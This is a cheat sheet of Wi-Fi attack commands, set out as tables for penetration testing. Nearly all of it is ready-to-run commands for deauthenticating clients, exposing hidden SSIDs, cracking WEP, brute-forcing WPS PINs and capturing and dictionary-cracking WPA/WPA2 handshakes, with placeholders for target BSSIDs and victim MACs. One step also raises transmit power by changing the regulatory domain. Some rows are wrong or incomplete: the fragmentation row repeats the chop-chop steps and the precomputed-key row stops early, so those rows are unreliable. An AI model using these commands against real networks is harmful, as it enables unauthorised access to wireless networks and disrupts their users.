# Wireless Penetration Testing Cheat Sheet

## Wireless Antenna

| Action                                 | Command                                        |
|----------------------------------------|------------------------------------------------|
| Kill Monitor Processes                | `airmon-ng check kill`                         |
| Open Monitor Mode                      | `ifconfig wlan0 down`<br>`airmon-ng start wlan0`<br>or<br>`iwconfig wlan0 mode monitor`<br>`ifconfig wlan0 up` |
| Increase Wi-Fi TX Power                | `iw reg set B0`<br>`iwconfig wlan0 txpower <NmW|NdBm|off|auto>`<br>Check with `iwconfig` |
| Change Wi-Fi Channel                   | `iwconfig wlan0 channel <SetChannel(1-14)>`    |

## Find Hidden SSID

| Action                                 | Command                                        |
|----------------------------------------|------------------------------------------------|
| Start Monitor Mode                     | `airmon-ng start wlan0`                       |
| Find Hidden SSID                       | `airodump-ng -c <Channel> --bssid <BSSID> mon0`<br>`aireplay-ng -0 20 -a <BSSID> -c <VictimMac> mon0` |

## WEP Cracking (via Client)

| Method                                  | Command                                        |
|-----------------------------------------|------------------------------------------------|
| ARP Request Replay Attack              | `airodump-ng -c <AP_Channel> --bssid <BSSID> -w <FileName> mon0`<br>`macchanger --show mon0`<br>`aireplay-ng -3 -x 1000 -n 1000 -b <BSSID> -h <OurMac> mon0`<br>`aircrack-ng -b <BSSID> <PCAP_of_FileName>` |
| Interactive Packet Replay Attack       | `airodump-ng -c <AP_Channel> --bssid <BSSID> -w <FileName> mon0`<br>`macchanger --show mon0`<br>`aireplay-ng -1 0 -a <BSSID> -h <OurMac> -e <ESSID> mon0`<br>`aircrack-ng -b <BSSID> <PCAP_of_FileName>` |
| SKA (Shared Key Authentication) Cracking | `airodump-ng -c <AP_Channel> --bssid <BSSID> -w <FileName> mon0`<br>`aireplay-ng -0 10 -a <BSSID> -c <VictimMac> mon0`<br>`aircrack-ng <PCAP_of_FileName>` |

## WEP Cracking (Clientless)

| Method                                  | Command                                        |
|-----------------------------------------|------------------------------------------------|
| Chop Chop Attack                        | `airodump-ng -c <AP_Channel> --bssid <BSSID> -w <FileName> mon0`<br>`macchanger --show mon0`<br>`aireplay-ng -1 0 -e <ESSID> -a <BSSID> -h <OurMac> mon0`<br>`packetforge-ng -0 -a <BSSID> -h <OurMac> -k <SourceIP> -l <DestinationIP> -y <XOR_PacketFile> -w <FileName2>`<br>`aircrack-ng <PCAP_of_FileName>` |
| Fragmentation Attack                   | `airodump-ng -c <AP_Channel> --bssid <BSSID> -w <FileName> mon0`<br>`macchanger --show mon0`<br>`aireplay-ng -1 0 -e <ESSID> -a <BSSID> -h <OurMac> mon0`<br>`packetforge-ng -0 -a <BSSID> -h <OurMac> -k <SourceIP> -l <DestinationIP> -y <XOR_PacketFile> -w <FileName2>`<br>`aircrack-ng <PCAP_of_FileName>` |

## WPA / WPA2 Cracking

| Method                                  | Command                                        |
|-----------------------------------------|------------------------------------------------|
| WPS Attack                              | `airmon-ng start wlan0`<br>`apt-get install reaver`<br>`wash -i mon0`<br>`reaver -i mon0 -b <BSSID> -vv -S`<br>or<br>`reaver -i mon0 -c <Channel> -b <BSSID> -p <PinCode> -vv -S` |
| Dictionary Attack                       | `airmon-ng start wlan0`<br>`airodump-ng -c <AP_Channel> --bssid <BSSID> -w <FileName> mon0`<br>`aireplay-ng -0 1 -a <BSSID> -c <VictimMac> mon0`<br>`aircrack-ng -w <WordlistFile> -b <BSSID> <Handshaked_PCAP>` |
| Crack with John The Ripper              | `airodump-ng -c <Channel> --bssid <BSSID> -w <FileName> mon0`<br>`aireplay-ng -0 1 -a <BSSID> -c <VictimMac> mon0`<br>`cd /pentest/passwords/john`<br>`./john --wordlist=<Wordlist> --rules --stdout | aircrack-ng -0 -e <ESSID> -w - <PCAP_of_FileName>`<br>`hccap2john <outFile>.hccap > <JohnOutFile>`<br>`john <JohnOutFile>` |
| Crack with coWPAtty                    | `airmon-ng start wlan0`<br>`airodump-ng -c <Channel> --bssid <BSSID> -w <FileName> mon0`<br>`aireplay-ng -0 1 -a <BSSID> -c <VictimMac> mon0`<br>`cowpatty -r <FileName> -f <Wordlist> -2 -s <SSID>` |
| Crack with Pyrit                       | `airmon-ng start wlan0`<br>`airodump-ng -c <Channel> --bssid <BSSID> -w <FileName> mon0`<br>`aireplay-ng -0 1 -a <BSSID> -c <VictimMac> mon0`<br>`pyrit -r <PCAP_of_FileName> -b <BSSID> -i <Wordlist> attack_passthrough` |
| Precomputed WPA Keys Database Attack   | `airmon-ng start wlan0`<br>`airodump-ng -c <AP_Channel> --bssid <BSSID> -w <FileName> mon0`<br>`aireplay-ng -0 1 -a <BSSID> -c <VictimMac> mon0`<br>`kwrite ESSID.txt`<br>`airolib-ng NEW_DB --import essid ESSID.txt`<br>`airolib-ng NEW_DB --import passwd <DictionaryFile>` |
